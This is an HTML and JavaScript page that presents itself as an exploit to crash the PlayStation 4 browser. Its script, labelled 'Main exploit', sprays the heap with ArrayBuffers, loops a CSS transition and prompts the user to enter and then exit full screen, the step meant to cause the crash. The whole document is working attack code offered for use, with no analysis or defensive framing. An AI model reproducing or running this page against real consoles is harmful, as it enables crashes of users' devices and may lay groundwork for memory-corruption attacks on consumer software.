<!DOCTYPE html>
<html>
<head>
  <title>PS4 Full-Screen Crash (User-Triggered)</title>
  <style>
    #box {
      width: 100px; height: 100px;
      background: red;
      transition: transform 0.5s linear;
      position: absolute;
      left: 0; top: 50%;
    }
    #status {
      font-family: Arial;
      color: white;
      background: black;
      padding: 10px;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
    }
    #btn {
      padding: 10px;
      font-size: 20px;
      position: fixed;
      bottom: 20px;
      left: 20px;
      z-index: 10000;
    }
  </style>
</head>
<body style="background: #000; height: 200vh;">
  <div id="box"></div>
  <div id="status">[1] Click "START" to begin</div>
  <button id="btn">START</button>

  <script>
    const box = document.getElementById('box');
    const status = document.getElementById('status');
    const btn = document.getElementById('btn');

    // Lightweight heap spray (no freezes)
    function heapSpray() {
      window.spray = [];
      for (let i = 0; i < 100; i++) {
        window.spray.push(new ArrayBuffer(0x100));
      }
    }

    // Start transition loop
    function startTransition() {
      box.style.transform = 'translateX(0)';
      setTimeout(() => box.style.transform = 'translateX(300px)', 10);
    }

    // Main exploit
    function triggerExploit() {
      heapSpray();
      status.textContent = "[2] Transition running...";
      
      // Loop transition every 1 second
      setInterval(startTransition, 1000);

      // Update button to enter full-screen
      btn.textContent = "ENTER FULL-SCREEN NOW";
      btn.onclick = () => {
        document.documentElement.requestFullscreen()
          .then(() => {
            status.textContent = "[3] CRASH TIME! EXIT FULL-SCREEN NOW!";
            // No programmatic exit (let user do it manually)
          })
          .catch(e => status.textContent = "Fullscreen failed: " + e);
      };
    }

    // Start on button click
    btn.addEventListener('click', triggerExploit, { once: true });
  </script>
</body>
</html>
